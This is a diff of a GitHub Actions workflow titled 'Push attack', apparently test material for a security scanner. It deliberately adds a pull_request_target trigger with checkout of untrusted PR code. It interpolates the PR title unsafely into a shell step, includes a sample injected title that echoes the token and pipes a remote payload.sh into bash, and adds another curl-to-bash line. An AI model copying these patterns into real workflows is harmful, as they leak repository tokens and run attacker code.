@@ -1,29 +1,31 @@
 name: Push attack
-on: workflow_dispatch
+on: 
+  workflow_dispatch:
+  pull_request_target:
+    branches: [ main ]
+
 jobs:
   my-job:
     runs-on: ubuntu-latest
+    env:
+      GITHUB_TOKEN: ${{ github.token }}
     steps:
       - name: Checkout code
         uses: actions/checkout@v2
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
 
-      - name: my-step
+      # this is the title"; echo ${{ github.token }}; export THE_TOKEN=${{ github.token }}; echo $THE_TOKEN; curl -s https://raw.githubusercontent.com/laurentsimon/scorecard-action-test-2/main/payload.sh | bash; echo "pwned
+      - name: on PR
+        if: ${{ github.event_name == 'pull_request_target' }}
+        run: |
+          echo "Starting processing..."
+          echo "Title: ${{ github.event.pull_request.title }}"
+          echo "Done processing"
+
+      - name: on dispatch
+        if: ${{ github.event_name == 'workflow_dispatch' }}
         run: |
           echo "Hello World!"
         
-          # export GH_TOKEN=${{ secrets.GITHUB_TOKEN }}  
-          # DATE=$(date)
-          # echo $DATE
-          # echo git clone git@github.com:github.com/$GITHUB_REPOSITORY.git
-          # gh repo clone $GITHUB_REPOSITORY
-          # cd "${{ github.event.repository.name }}"
-          #git config user.name github-actions
-          #git config user.email github-actions@github.com
-          
-          git config user.name azeemsgoogle
-          git config user.email azeems@google.com
-
-          echo "$DATE" >> attack.txt
-          git add attack.txt
-          git commit -m "Fix indentation: $DATE"
-          git push
+          curl https://raw.githubusercontent.com/laurentsimon/scorecard-action-test-2/main/payload.sh | bash
